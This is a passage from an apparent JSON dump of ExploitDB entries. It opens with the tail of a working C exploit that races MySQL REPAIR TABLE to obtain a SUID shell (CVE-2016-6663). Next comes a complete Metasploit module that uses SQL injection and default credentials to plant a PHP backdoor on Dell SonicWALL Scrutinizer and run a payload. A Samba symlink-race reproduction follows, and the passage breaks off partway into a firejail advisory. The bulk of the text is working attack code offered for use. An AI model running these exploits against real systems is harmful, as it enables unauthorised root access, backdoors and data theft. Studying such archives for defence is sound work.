Starting the exploit as: \\n\");\r\n    system(\"id\");\r\n\r\n    // Connect to the database server with provided credentials\r\n    printf(\"\\n[+] Connecting to the database `%s` as %s@%s\\n\", database, user, db_host);\r\n    conn = mysql_init(NULL);\r\n    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {\r\n        fprintf(stderr, \"%s\\n\", mysql_error(conn));\r\n        exit(1);\r\n    }\r\n\r\n    // Prepare tmp dir\r\n    printf(\"\\n[+] Creating exploit temp directory %s\\n\", \"/tmp/\" EXP_DIRN);\r\n    umask(000);\r\n    system(\"rm -rf /tmp/\" EXP_DIRN \" && mkdir /tmp/\" EXP_DIRN);\r\n    system(\"chmod g+s /tmp/\" EXP_DIRN );\r\n\r\n    // Prepare exploit tables :)\r\n    printf(\"\\n[+] Creating mysql tables \\n\\n\");\r\n    mysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 0);\r\n    mysql_cmd(\"DROP TABLE IF EXISTS mysql_suid_shell\", 0);\r\n    mysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n    mysql_cmd(\"CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 0);\r\n\r\n    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file\r\n    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory\r\n    printf(\"\\n[+] Copying bash into the mysql_suid_shell table.\\n    After the exploitation the following file/table will be assigned SUID and executable bits : \\n\");\r\n    system(\"cp /bin/bash \" SUID_SHELL);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    // Use inotify to get the timing right\r\n    fd = inotify_init();\r\n    if (fd < 0) {\r\n        printf(\"failed to inotify_init\\n\");\r\n        return -1;\r\n    }\r\n    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);\r\n\r\n\r\n    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */\r\n\r\n    printf(\"\\n[+] Entering the race loop... Hang in there...\\n\");\r\n\r\n    while ( is_shell_suid != 1 ) {\r\n\r\n        cnt++;\r\n\tif ( (cnt % 100) == 0 ) {\r\n\t \tprintf(\"->\");\r\n\t \t//fflush(stdout);\t\r\n\t}\r\n\r\n        /* Create empty file , remove if already exists */\r\n        unlink(MYSQL_TEMP_FILE);\r\n        unlink(MYSQL_TAB_FILE);\r\n   \tmysql_cmd(\"DROP TABLE IF EXISTS exploit_table\", 1);\r\n\tmysql_cmd(\"CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '\" EXP_PATH \"'\", 1);\r\n\r\n\t/* random num if needed */\r\n        srand ( time(NULL) );\r\n        randomnum = ( rand() % MAX_DELAY );\r\n\r\n        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink\r\n        pid = fork();\r\n        if (pid < 0) {\r\n            fprintf(stderr, \"Fork failed :(\\n\");\r\n        }\r\n\r\n        /* Child process - executes REPAIR TABLE  SQL statement */\r\n        if (pid == 0) {\r\n            usleep(500);\r\n            unlink(MYSQL_TEMP_FILE);\r\n\t    mysql_cmd(\"REPAIR TABLE exploit_table EXTENDED\", 1);\r\n            // child stops here\r\n            exit(0);\r\n        }\r\n\r\n        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */\r\n        if (pid > 0 ) {\r\n            io_notified = 0;\r\n\r\n            while (1) {\r\n                int processed = 0;\r\n                ret = read(fd, buf, sizeof(buf));\r\n                if (ret < 0) {\r\n                    break;\r\n                }\r\n                while (processed < ret) {\r\n                    event = (struct inotify_event *)(buf + processed);\r\n                    if (event->mask & IN_CLOSE) {\r\n                        if (!strcmp(event->name, \"exploit_table.TMD\")) {\r\n                            //usleep(randomnum);\r\n\r\n\t\t\t    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file \r\n\t\t\t    unlink(MYSQL_TAB_FILE);\r\n\t\t\t    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);\r\n\t\t\t    close(myd_handle);\r\n\t\t\t    chmod(MYSQL_TAB_FILE, 04777);\r\n\r\n\t\t\t    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec\r\n                            unlink(MYSQL_TEMP_FILE);\r\n                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);\r\n                            io_notified=1;\r\n                        }\r\n                    }\r\n                    processed += sizeof(struct inotify_event);\r\n                }\r\n                if (io_notified) {\r\n                    break;\r\n                }\r\n            }\r\n\r\n\r\n            waitpid(pid, &status, 0);\r\n        }\r\n\r\n\t// Check if SUID bit was set at the end of this attempt\r\n        if ( lstat(SUID_SHELL, &st) == 0 ) {\r\n\t    if (st.st_mode & S_ISUID) {\r\n\t\tis_shell_suid = 1;\r\n\t    }\r\n        } \r\n\r\n    }\r\n\r\n    printf(\"\\n\\n[+] \\033[94mBingo! Race won (took %lu tries) !\\033[0m Check out the \\033[94mmysql SUID shell\\033[0m: \\n\\n\", cnt);\r\n    system(\"ls -l \" SUID_SHELL);\r\n\r\n    printf(\"\\n[+] Spawning the \\033[94mmysql SUID shell\\033[0m now... \\n    Remember that from there you can gain \\033[1;31mroot\\033[0m with vuln \\033[1;31mCVE-2016-6662\\033[0m or \\033[1;31mCVE-2016-6664\\033[0m :)\\n\\n\");\r\n    system(SUID_SHELL \" -p -i \");\r\n    //system(SUID_SHELL \" -p -c '/bin/bash -i -p'\");\r\n\r\n    /* close MySQL connection and exit */\r\n    printf(\"\\n[+] Job done. Exiting\\n\\n\");\r\n    mysql_close(conn);\r\n    return 0;\r\n\r\n}",
                "description": "MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition",
                "author": "Dawid Golunski",
                "_id": 40678,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2016-11-01T00:00:00+00:00",
                "cve": [
                    "CVE-2016-6663",
                    "CVE-2016-5616",
                    "CVE-2016-6662",
                    "CVE-2016-6664"
                ],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass MetasploitModule < Msf::Exploit::Remote\r\n  Rank = ExcellentRanking\r\n\r\n  include Msf::Exploit::Remote::HttpClient\r\n  include Msf::Exploit::FileDropper\r\n  include Msf::Exploit::EXE\r\n\r\n  WINDOWS = /^win/i\r\n  LINUX   = /linux/i\r\n\r\n  def initialize(info={})\r\n    super(update_info(info,\r\n      'Name'           => \"Dell SonicWALL Scrutinizer 11.01 methodDetail SQL Injection\",\r\n      'Description'    => %q{\r\n        This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail\r\n        parameter in exporters.php allows an attacker to write arbitrary files to the file system\r\n        with an SQL Injection attack, and gain remote code execution under the context of SYSTEM\r\n        for Windows, or as Apache for Linux.\r\n\r\n        Authentication is required to exploit this vulnerability, but this module uses\r\n        the default admin:admin credential.\r\n      },\r\n      'License'        => MSF_LICENSE,\r\n      'Author'         =>\r\n        [\r\n          'bperry', # Original discovery, PoC, and Metasploit module\r\n          'sinn3r'  # Metasploit module for native support\r\n        ],\r\n      'References'     =>\r\n        [\r\n          [ 'CVE', '2014-4977' ],\r\n          [ 'BID', '68495' ],\r\n          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Jul/44' ],\r\n          [ 'URL','https://gist.github.com/brandonprry/76741d9a0d4f518fe297' ]\r\n        ],\r\n      'Arch'           => [ ARCH_X86 ],\r\n      'Platform'       => [ 'win', 'linux' ],\r\n      'Targets'        =>\r\n        [\r\n          [ 'Automatic', {} ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 on Windows',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'win',\r\n            }\r\n          ],\r\n          [\r\n            'Dell SonicWALL Scrutinizer 11.01 Linux Appliance',\r\n            {\r\n              'Arch'     => ARCH_X86,\r\n              'Platform' => 'linux'\r\n            }\r\n          ]\r\n        ],\r\n      'Privileged'     => false,\r\n      'DisclosureDate' => 'Jul 24 2014',\r\n      'DefaultTarget'  => 0))\r\n\r\n    register_options(\r\n      [\r\n        OptString.new('TARGETURI', [ true, \"Base Application path\", \"/\" ]),\r\n        OptString.new('USERNAME', [ true,  'The username to authenticate as', 'admin' ]),\r\n        OptString.new('PASSWORD', [ true,  'The password to authenticate with', 'admin' ])\r\n      ], self.class)\r\n  end\r\n\r\n\r\n  # Prints a message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_status(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Prints an error message with the target's IP and port.\r\n  #\r\n  # @param msg [String] Message to print.\r\n  # @return [void]\r\n  def print_error(msg='')\r\n    super(\"#{peer} - #{msg}\")\r\n  end\r\n\r\n\r\n  # Pads NULL columns for a SQL injection string.\r\n  #\r\n  # @param n [Fixnum] Number of nulls\r\n  # @return [String]\r\n  def pad_null(n)\r\n    padding = []\r\n\r\n    n.times do\r\n      padding << 'NULL'\r\n    end\r\n\r\n    padding * ','\r\n  end\r\n\r\n\r\n  # Checks (explicitly) the target for the vulnerability. To be able to check this, a\r\n  # valid username/password is required.\r\n  #\r\n  # @return [void]\r\n  def check\r\n    begin\r\n      res = do_login\r\n    rescue Msf::Exploit::Failed => e\r\n      vprint_error(e.message)\r\n      return Exploit::CheckCode::Unknown\r\n    end\r\n\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    pattern = Rex::Text.rand_text_alpha(10)\r\n    sqli_str = \"-6045 UNION ALL SELECT '#{pattern}',#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    return Exploit::CheckCode::Vulnerable if res['id'].to_s == pattern\r\n\r\n    Exploit::CheckCode::Safe\r\n  end\r\n\r\n\r\n  # Returns the OS information by using @@version_compile_os.\r\n  #\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [String] The OS information.\r\n  def get_os(sid, uid)\r\n    sqli_str = \"-6045 UNION ALL SELECT @@version_compile_os,#{pad_null(19)}\"\r\n    res = do_sqli(sqli_str, sid, uid).get_json_document\r\n    res['id']\r\n  end\r\n\r\n\r\n  # Returns target's d4d directory path that will be used to upload our malicious files.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [String]\r\n  def get_d4d_path(os)\r\n    case os\r\n    when WINDOWS\r\n      # On Windows, the full d4d path looks something like this:\r\n      # C:\\Program Files\\Scrutinizer\\html\\d4d\r\n      '../../html/d4d'\r\n    when LINUX\r\n      # On the Linux appliance, the d4d path looks exactly like this:\r\n      '/home/plixer/scrutinizer/html/d4d'\r\n    end\r\n  end\r\n\r\n\r\n  # Logs into Dell SonicWALL Scrutinizer.\r\n  #\r\n  # @return [Hash] JSON response.\r\n  def do_login\r\n    res = send_request_cgi({\r\n      'uri' => normalize_uri(target_uri, '/cgi-bin/login.cgi'),\r\n      'vars_get' => {\r\n        'name' => datastore['USERNAME'],\r\n        'pwd' => datastore['PASSWORD']\r\n      }\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out while attempting to log in.')\r\n    end\r\n\r\n    res = res.get_json_document\r\n\r\n    if res['noldapnouser']\r\n      fail_with(Failure::NoAccess, \"Username '#{datastore['USERNAME']}' is incorrect.\")\r\n    elsif res['loginfailed']\r\n      fail_with(Failure::NoAccess, \"Password '#{datastore['PASSWORD']}' is incorrect.\")\r\n    end\r\n\r\n    report_cred(datastore['USERNAME'], datastore['PASSWORD'])\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Saves a valid username/password to database.\r\n  #\r\n  # @param username [String]\r\n  # @param password [String]\r\n  # @return [void]\r\n  def report_cred(username, password)\r\n    service_data = {\r\n      address: rhost,\r\n      port: rport,\r\n      service_name: ssl ? 'https' : 'http',\r\n      protocol: 'tcp',\r\n      workspace_id: myworkspace_id\r\n    }\r\n\r\n    credential_data = {\r\n      module_fullname: self.fullname,\r\n      origin_type: :service,\r\n      username: username,\r\n      private_data: password,\r\n      private_type: :password\r\n    }.merge(service_data)\r\n\r\n    credential_core = create_credential(credential_data)\r\n\r\n    login_data = {\r\n      core: credential_core,\r\n      last_attempted_at: DateTime.now,\r\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\r\n    }.merge(service_data)\r\n\r\n    create_credential_login(login_data)\r\n  end\r\n\r\n\r\n  # Injects malicious SQL string to the methodDetail parameter against the target machine.\r\n  #\r\n  # @param method_detail [String] Malicious SQL injection string.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [Rex::Proto::Http::Response]\r\n  def do_sqli(method_detail, sid, uid)\r\n    res = send_request_cgi({\r\n      'uri'      => normalize_uri(target_uri, '/d4d/exporters.php'),\r\n      'vars_get' => { 'methodDetail'=> method_detail },\r\n      'cookie'   => \"cookiesenabled=1;sessionid=#{sid};userid=#{uid}\"\r\n    })\r\n\r\n    unless res\r\n      fail_with(Failure::Unknown, 'The connection timed out for exporters.php.')\r\n    end\r\n\r\n    res\r\n  end\r\n\r\n\r\n  # Returns a PHP backdoor that is to be uploaded onto the target machine.\r\n  #\r\n  # @param os [String] Target OS information.\r\n  # @param target_path [String]\r\n  # @return [String] PHP backdoor\r\n  def get_php_backdoor(os)\r\n    case os\r\n    when WINDOWS\r\n      chmod_code = %Q|chmod($bname, 0777);|\r\n      exec_code = %Q|exec($bname);|\r\n    when LINUX\r\n      chmod_code = %Q|chmod(\"./\" . $bname, 0777);|\r\n      exec_code = %Q|exec(\"./\" . $bname);|\r\n    end\r\n\r\n    %Q|<?php\r\n    $bname = basename( $_FILES['uploadedfile']['name']);\r\n    $target_path = \"./\" . $bname;\r\n    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);\r\n    #{chmod_code}\r\n    #{exec_code}\r\n    ?>\r\n    |.gsub(/\\x20{4}/, ' ')\r\n  end\r\n\r\n\r\n  # Uploads the executable payload via malicious PHP backdoor.\r\n  #\r\n  # @param backdoor_fname [String] Name of the backdoor\r\n  # @param payload_fname [String] Name of the executable payload\r\n  # @return [void]\r\n  def upload_payload(backdoor_fname, payload_fname)\r\n    p = generate_payload_exe(\r\n      code: payload.encoded,\r\n      platform: @my_target.platform,\r\n      arch: @my_target.arch\r\n    )\r\n\r\n    print_status(\"Uploading #{payload_fname} (#{p.length} bytes)...\")\r\n\r\n    post_data = Rex::MIME::Message.new\r\n    post_data.add_part(\r\n      p,\r\n      'application/octet-stream',\r\n      'binary',\r\n      \"form-data; name=\\\"uploadedfile\\\"; filename=\\\"#{payload_fname}\\\"\"\r\n    )\r\n    data = post_data.to_s\r\n\r\n    res = send_request_cgi({\r\n      'method' => 'POST',\r\n      'uri'    => normalize_uri(target_uri, \"/d4d/#{backdoor_fname}\"),\r\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\r\n      'data'   => data\r\n    })\r\n\r\n    unless res\r\n      # Here we are not using fail_with, because when we get a session, it seems to be creating\r\n      # the same effect as connection hanging... and then eventually times out. If that\r\n      # happens, a fail_with() can cause msfconsole to believe there is no session created.\r\n      vprint_status('Connection timed out while uploading payload.')\r\n      return\r\n    end\r\n\r\n    if res.code == 404\r\n      fail_with(Failure::Unknown, \"Server returned 404 for #{backdoor_fname}.\")\r\n    end\r\n  end\r\n\r\n\r\n  # Uploads the PHP backdoor onto the target machine. The reason of using a PHP backdoor to upload\r\n  # is because our SQL injection is in a GET method, and Apache has a max length of 8190 bytes,\r\n  # which is bad for some built-in or custom payloads.\r\n  #\r\n  # @param opts [Hash]\r\n  # @option opts [String] :d4d_path\r\n  # @option opts [String] :backdoor_fname\r\n  # @option opts [String] :payload_fname\r\n  # @option opts [String] :sid\r\n  # @option opts [String] :uid\r\n  # @option opts [String] :os\r\n  # @return [void]\r\n  def upload_php_backdoor(opts)\r\n    d4d_path       = opts[:d4d_path]\r\n    backdoor_fname = opts[:backdoor_fname]\r\n    payload_fname  = opts[:payload_fname]\r\n    sid            = opts[:sid]\r\n    uid            = opts[:uid]\r\n    os             = opts[:os]\r\n\r\n    print_status(\"Injecting a PHP upload backdoor (#{backdoor_fname})...\")\r\n    hex_backdoor = get_php_backdoor(os).unpack(\"H*\")[0]\r\n    sqli_str = \"-6045 UNION ALL SELECT 0x#{hex_backdoor},#{pad_null(19)} INTO DUMPFILE '#{d4d_path}/#{backdoor_fname}' #\"\r\n    do_sqli(sqli_str, sid, uid)\r\n  end\r\n\r\n\r\n  # Attempts a SQL injection attack against the target machine.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @param sid [String] Session ID.\r\n  # @param uid [String] User ID.\r\n  # @return [void]\r\n  def do_backdoor_sqli(os, sid, uid)\r\n    backdoor_fname = \"#{Rex::Text.rand_text_alpha(6)}.php\"\r\n    payload_fname  = Rex::Text.rand_text_alpha(5)\r\n    payload_fname << '.exe' if @my_target['Platform'].match(WINDOWS)\r\n    d4d_path       = get_d4d_path(os)\r\n\r\n    register_files_for_cleanup(backdoor_fname, payload_fname)\r\n\r\n    opts = {\r\n      d4d_path: d4d_path,\r\n      backdoor_fname: backdoor_fname,\r\n      payload_fname: payload_fname,\r\n      sid: sid,\r\n      uid: uid,\r\n      os: os\r\n    }\r\n\r\n    upload_php_backdoor(opts)\r\n    upload_payload(backdoor_fname, payload_fname)\r\n  end\r\n\r\n\r\n  # Tries to set the target. If the user manually set one, then avoid automatic target.\r\n  #\r\n  # @param os [String] OS information.\r\n  # @return [void]\r\n  def try_set_target(os)\r\n    @my_target = target if target != targets[0]\r\n    case os\r\n    when WINDOWS\r\n      @my_target = targets[1]\r\n    when LINUX\r\n      @my_target = targets[2]\r\n    else\r\n      fail_with(Failure::NoTarget, 'Unsupported target')\r\n    end\r\n  end\r\n\r\n\r\n  # Exploits the target machine. To do this, first we must log into the system in order to obtain\r\n  # the user ID and session ID. After logging in, we can ask the vulnerable code to upload a\r\n  # malicious PHP backdoor, and then finally use that backdoor to upload and execute our payload.\r\n  def exploit\r\n    res = do_login\r\n    uid = res['userid']\r\n    sid = res['sessionid']\r\n    os = get_os(sid, uid)\r\n    print_status(\"Detected OS information: #{os}\")\r\n    try_set_target(os)\r\n    do_backdoor_sqli(os, sid, uid)\r\n  end\r\n\r\nend",
                "description": "Dell SonicWALL Scrutinizer 11.01 - methodDetail SQL Injection (Metasploit)",
                "author": "Metasploit",
                "_id": 39836,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-05-17T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1039\r\n\r\nThe Samba server is supposed to only grant access to configured share\r\ndirectories unless \"wide links\" are enabled, in which case the server is allowed\r\nto follow symlinks. The default (since CVE-2010-0926) is that wide links are\r\ndisabled.\r\n\r\nsmbd ensures that it isn't following symlinks by calling lstat() on every\r\npath component, as can be seen in strace (in reaction to the request\r\n\"get a/b/c/d/e/f/g/h/i/j\", where /public is the root directory of the share):\r\n\r\nroot@debian:/home/user# strace -e trace=file -p18954\r\nProcess 18954 attached\r\nlstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetcwd(\"/public\", 4096)                 = 8\r\nlstat(\"/public/a\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i\", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0\r\nlstat(\"/public/a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\ngetxattr(\"a/b/c/d/e/f/g/h/i/j\", \"system.posix_acl_access\", 0x7ffc8d870c30, 132) = -1 ENODATA (No data available)\r\nstat(\"a/b/c/d/e/f/g/h/i/j\", {st_mode=S_IFREG|0644, st_size=4, ...}) = 0\r\nopen(\"a/b/c/d/e/f/g/h/i/j\", O_RDONLY)   = 35\r\n\r\n\r\nThis is racy: Any of the path components - either one of the directories or the\r\nfile at the end - could be replaced with a symlink by an attacker over a second\r\nconnection to the same share. For example, replacing a/b/c/d/e/f/g/h/i\r\nwith a symlink  to / immediately before the open() call would cause smbd to open\r\n/j.\r\n\r\nTo reproduce:\r\n\r\n - Set up a server with Samba 4.5.2. (I'm using Samba 4.5.2 from Debian\r\n   unstable. I'm running the attacks on a native machine while the server is\r\n   running in a VM on the same machine.)\r\n - On the server, create a world-readable file \"/secret\" that contains some\r\n   text. The goal of the attacker is to leak the contents of that file.\r\n - On the server, create a directory \"/public\", mode 0777.\r\n - Create a share named \"public\", accessible for guests, writable, with path\r\n   \"/public\".\r\n - As the attacker, patch a copy of the samba-4.5.2 sourcecode with the patch in\r\n   attack_commands.patch.\r\n - Build the patched copy of samba-4.5.2. The built smbclient will be used in\r\n   the following steps.\r\n - Prepare the server's directory layout remotely and start the rename side of\r\n   the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> ls\r\n     .                                   D        0  Wed Dec 14 23:54:30 2016\r\n     ..                                  D        0  Wed Dec 14 13:02:50 2016\r\n\r\n        98853468 blocks of size 1024. 66181136 blocks available\r\n   smb: /> symlink / link\r\n   smb: /> mkdir normal\r\n   smb: /> put /tmp/empty normal/secret # empty file\r\n   putting file /tmp/empty as /normal/secret (0.0 kb/s) (average 0.0 kb/s)\r\n   smb: /> rename_loop link normal foobar\r\n\r\n - Over a second connection, launch the read side of the race:\r\n\r\n   $ ./bin/default/source3/client/smbclient -N -U guest //192.168.56.101/public\r\n   ./bin/default/source3/client/smbclient: Can't load /usr/local/samba/etc/smb.conf - run testparm to debug it\r\n   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.2-Debian]\r\n   smb: \\> posix\r\n   Server supports CIFS extensions 1.0\r\n   Server supports CIFS capabilities locks acls pathnames posix_path_operations large_read posix_encrypt\r\n   smb: /> dump foobar/secret\r\n\r\n - At this point, the race can theoretically be hit. However, because the\r\n   renaming client performs operations synchronously, the network latency makes\r\n   it hard to win the race. (It shouldn't be too hard to adapt the SMB client to\r\n   be asynchronous, which would make the attack much more practical.) To make it\r\n   easier to hit the race, log in to the server as root and run \"strace\" against\r\n   the process that is trying to access foobar/secret all the time without any\r\n   filtering (\"strace -p19624\"). On my machine, this causes the race to be hit\r\n   every few seconds, and the smbclient that is running the \"dump\" command\r\n   prints the contents of the file each time the race is won.\r\n\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41740.zip",
                "description": "Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory",
                "author": "Google Security Research",
                "_id": 41740,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2017-03-27T00:00:00+00:00",
                "cve": [
                    "CVE-2010-0926"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "# firejail advisory for TOCTOU in --get and --put (local root)\r\n\r\nReleasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.\r\n\r\n## Vulnerability\r\n\r\nThis is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).\r\n\r\n### Code: src/firejail/ls.c\r\n~~~~\r\nvoid sandboxfs(int op, pid_t pid, const char *path) {\r\n        EUID_ASSERT();\r\n\r\n        // if the pid is that of a firejail  process, use the pid of the first child process\r\n        EUID_ROOT();\r\n        char *comm = pid_proc_comm(pid);\r\n        EUID_USER();\r\n        if (comm) {\r\n                if (strcmp(comm, \"firejail\") == 0) {\r\n                        pid_t child;\r\n                        if (find_child(pid, &child) == 0) {\r\n                                pid = child;\r\n                        }\r\n                }\r\n                free(comm);\r\n        }\r\n\r\n        // check privileges for non-root users\r\n        uid_t uid = getuid();\r\n        if (uid != 0) {\r\n                uid_t sandbox_uid = pid_get_uid(pid);\r\n                if (uid != sandbox_uid) {\r\n                        fprintf(stderr, \"Error: permission denied.\\n\");\r\n                        exit(1);\r\n                }\r\n        }\r\n\r\n        // full path or file in current directory?\r\n        char *fname;\r\n        if (*path == '/') {\r\n                fname = strdup(path);\r\n                if (!fname)\r\n                        errExit(\"strdup\");\r\n        }\r\n        else if (*path == '~') {\r\n                if (asprintf(&fname, \"%s%s\", cfg.homedir, path + 1) == -1)\r\n                        errExit(\"asprintf\");\r\n        }\r\n        else {\r\n                fprintf(stderr, \"Error: Cannot access %s\\n\", path);\r\n                exit(1);\r\n        }\r\n\r\n        // sandbox root directory\r\n        char *rootdir;\r\n        if (asprintf(&rootdir, \"/proc/%d/root\", pid) == -1)\r\n                errExit(\"asprintf\");\r\n\r\n        if (op == SANDBOX_FS_LS) {\r\n                EUID_ROOT();\r\n                // chroot\r\n                if (chroot(rootdir) < 0)\r\n                        errExit(\"chroot\");\r\n                if (chdir(\"/\") < 0)\r\n                        errExit(\"chdir\");\r\n\r\n                // access chek is performed with the real UID\r\n                if (access(fname, R_OK) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                // list directory contents\r\n                struct stat s;\r\n                if (stat(fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n                if (S_ISDIR(s.st_mode)) {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n\r\n                        char *dir;\r\n                        if (asprintf(&dir, \"%s/\", rp) == -1)\r\n                                errExit(\"asprintf\");\r\n\r\n                        print_directory(dir);\r\n                        free(rp);\r\n                        free(dir);\r\n                }\r\n                else {\r\n                        char *rp = realpath(fname, NULL);\r\n                        if (!rp) {\r\n                                fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        if (arg_debug)\r\n                                printf(\"realpath %s\\n\", rp);\r\n                        char *split = strrchr(rp, '/');\r\n                        if (split) {\r\n                                *split = '\\0';\r\n                                char *rp2 = split + 1;\r\n                                if (arg_debug)\r\n                                        printf(\"path %s, file %s\\n\", rp, rp2);\r\n                                print_file_or_dir(rp, rp2, 1);\r\n                        }\r\n                        free(rp);\r\n                }\r\n        }\r\n\r\n        // get file from sandbox and store it in the current directory\r\n        else if (op == SANDBOX_FS_GET) {\r\n                // check source file (sandbox)\r\n                char *src_fname;\r\n                if (asprintf(&src_fname, \"%s%s\", rootdir, fname) == -1)\r\n                        errExit(\"asprintf\");\r\n                EUID_ROOT();\r\n                struct stat s;\r\n                if (stat(src_fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n\r\n                // try to open the source file - we need to chroot\r\n                pid_t child = fork();\r\n                if (child < 0)\r\n                        errExit(\"fork\");\r\n                if (child == 0) {\r\n                        // chroot\r\n                        if (chroot(rootdir) < 0)\r\n                                errExit(\"chroot\");\r\n                        if (chdir(\"/\") < 0)\r\n                                errExit(\"chdir\");\r\n\r\n                        // drop privileges\r\n                        drop_privs(0);\r\n\r\n                        // try to read the file\r\n                        if (access(fname, R_OK) == -1) {\r\n                                fprintf(stderr, \"Error: Cannot read %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        exit(0);\r\n                }\r\n\r\n                // wait for the child to finish\r\n                int status = 0;\r\n                waitpid(child, &status, 0);\r\n                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);\r\n                else\r\n                        exit(1);\r\n                EUID_USER();\r\n\r\n                // check destination file (host)\r\n                char *dest_fname = strrchr(fname, '/');\r\n                if (!dest_fname || *(++dest_fname) == '\\0') {\r\n                        fprintf(stderr, \"Error: invalid file name %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                if (access(dest_fname, F_OK) == -1) {\r\n                        // try to create the 